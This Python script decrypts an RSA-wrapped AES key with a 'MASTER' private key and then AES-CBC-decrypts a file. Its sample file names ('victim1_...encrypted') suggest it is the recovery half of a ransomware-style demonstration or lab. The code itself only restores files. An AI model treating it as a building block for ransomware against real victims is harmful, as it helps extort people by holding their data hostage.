from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os

# Decrypt the AES key using RSA private key
def decrypt_aes_key_with_rsa(private_key_file_path, aes_key_file_path):
    # Load the RSA private key from the specified file
    with open(private_key_file_path, "rb") as private_key_file:
        private_key = serialization.load_pem_private_key(private_key_file.read(), password=None)

    # Read the encrypted AES key from the specified file
    with open(aes_key_file_path, "rb") as aes_key_file:
        encrypted_aes_key = aes_key_file.read()

    # Decrypt the AES key using RSA private key with OAEP padding
    aes_key = private_key.decrypt(
        encrypted_aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    print(">> AES key has been decrypted using the RSA private key.")
    return aes_key

# Decrypt the encrypted file using the AES key
def decrypt_file_using_aes(file_path, aes_key):
    # Read the encrypted file (victim1_private_key.pem.encrypted)
    with open(file_path, "rb") as encrypted_file:
        encrypted_data = encrypted_file.read()

    # Extract the IV (the first 16 bytes)
    iv = encrypted_data[:16]
    encrypted_content = encrypted_data[16:]

    # Initialize AES decryption (using CBC mode)
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()

    # Decrypt the file content
    decrypted_data = decryptor.update(encrypted_content) + decryptor.finalize()

    # Unpad the decrypted data (removes padding added during encryption)
    pad_len = decrypted_data[-1]
    unpadded_data = decrypted_data[:-pad_len]

    # Save the decrypted file (victim1_private_key.pem)
    decrypted_file_path = file_path.replace(".encrypted", ".DECRYPTED")
    with open(decrypted_file_path, "wb") as decrypted_file:
        decrypted_file.write(unpadded_data)

    print(f">> File has been decrypted and saved as '{decrypted_file_path}'.")

# Example usage
if __name__ == "__main__":
    # Prompt user for the RSA private key file and the encrypted AES key file
    private_key_file_path = input("Enter the path to the RSA private key file (e.g., MASTER_private_key.pem): ")
    aes_key_file_path = input("Enter the path to the encrypted AES key file (e.g., victim1_aes_key.bin.encrypted): ")

    if not os.path.isfile(private_key_file_path):
        print(">> The RSA private key file does not exist. Exiting...")
        exit()

    if not os.path.isfile(aes_key_file_path):
        print(">> The encrypted AES key file does not exist. Exiting...")
        exit()

    # Decrypt the AES key using the RSA private key
    aes_key = decrypt_aes_key_with_rsa(private_key_file_path, aes_key_file_path)

    # Prompt user for the encrypted file to decrypt
    encrypted_file_path = input("Enter the path to the encrypted file (e.g., victim1_private_key.pem.encrypted): ")

    if not os.path.isfile(encrypted_file_path):
        print(">> The encrypted file does not exist. Exiting...")
        exit()

    # Decrypt the encrypted file using the decrypted AES key
    decrypt_file_using_aes(encrypted_file_path, aes_key)
